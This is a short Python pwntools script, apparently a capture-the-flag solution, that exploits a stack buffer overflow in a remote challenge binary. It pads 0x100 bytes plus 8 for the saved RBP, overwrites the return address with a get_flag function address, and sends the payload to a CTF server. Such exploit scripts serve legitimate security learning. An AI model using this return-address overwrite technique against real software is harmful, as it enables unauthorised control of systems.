# RazviOverflow
# Python

from pwn import * 

get_flag_address = 0x004006e7 #\xe7\x06\x40\x00\x00\x00\x00\x00

padding = b"A" * 0x100
padding += b"B" * 0x8 # Sobreescribir el OLD_RBP

#print(p64(get_flag_address))

payload = padding + p64(get_flag_address)


#binary = process("./program")
binary = remote("chals20.cybercastors.com", 14425)
print(binary.recv())
binary.sendline(payload)
print(binary.recvall())
binary.interactive()

